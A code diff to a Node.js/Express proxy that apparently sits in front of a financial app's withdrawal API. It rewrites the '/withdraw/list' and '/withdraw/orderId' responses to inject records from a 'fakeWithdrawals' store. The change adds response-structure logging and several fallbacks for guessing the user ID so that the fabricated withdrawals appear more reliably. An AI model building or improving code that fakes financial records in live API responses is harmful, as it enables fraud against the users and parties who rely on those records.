@@ -1004,7 +1004,38 @@ app.all('/withdraw/list', async (req, res) => {
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
 
-    const detectedUserId = extractUserId(req, jsonResp);
+    console.log('[withdraw/list] Response structure:', jsonResp ? JSON.stringify({
+      code: jsonResp.code,
+      dataType: typeof jsonResp.data,
+      isArray: Array.isArray(jsonResp.data),
+      hasList: jsonResp.data?.list !== undefined,
+      hasRecords: jsonResp.data?.records !== undefined,
+      dataKeys: jsonResp.data ? Object.keys(jsonResp.data).slice(0, 10) : [],
+      firstItemKeys: (() => {
+        let items = Array.isArray(jsonResp.data) ? jsonResp.data : (jsonResp.data?.list || jsonResp.data?.records || []);
+        return items.length > 0 ? Object.keys(items[0]).slice(0, 15) : [];
+      })()
+    }).substring(0, 500) : 'null');
+
+    let detectedUserId = extractUserId(req, jsonResp);
+    console.log('[withdraw/list] Detected userId:', detectedUserId, 'fakeWithdrawals:', Object.keys(bankData.fakeWithdrawals || {}));
+
+    if (!detectedUserId && jsonResp && jsonResp.data) {
+      let items = null;
+      if (Array.isArray(jsonResp.data)) items = jsonResp.data;
+      else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) items = jsonResp.data.list;
+      else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) items = jsonResp.data.records;
+      if (items && items.length > 0 && items[0].userId) {
+        detectedUserId = String(items[0].userId);
+      }
+    }
+
+    if (!detectedUserId && jsonResp && bankData.fakeWithdrawals && Object.keys(bankData.fakeWithdrawals).length > 0) {
+      const fakeUserIds = Object.keys(bankData.fakeWithdrawals);
+      if (fakeUserIds.length === 1) {
+        detectedUserId = fakeUserIds[0];
+      }
+    }
 
     if (jsonResp && detectedUserId && bankData.fakeWithdrawals && bankData.fakeWithdrawals[detectedUserId]) {
       const fake = bankData.fakeWithdrawals[detectedUserId];
@@ -1036,9 +1067,15 @@ app.all('/withdraw/list', async (req, res) => {
 
 app.all('/withdraw/orderId', async (req, res) => {
   const bankData = await loadData();
-  const detectedUserId = extractUserId(req, null);
+  let detectedUserId = extractUserId(req, null);
   const qs = new URLSearchParams((req.originalUrl.split('?')[1]) || '');
   const reqOrderId = req.parsedBody?.orderId || qs.get('orderId') || '';
+
+  if (!detectedUserId && bankData.fakeWithdrawals) {
+    for (const [uid, fw] of Object.entries(bankData.fakeWithdrawals)) {
+      if (fw.orderId === reqOrderId) { detectedUserId = uid; break; }
+    }
+  }
 
   if (detectedUserId && bankData.fakeWithdrawals && bankData.fakeWithdrawals[detectedUserId]) {
     const fake = bankData.fakeWithdrawals[detectedUserId];
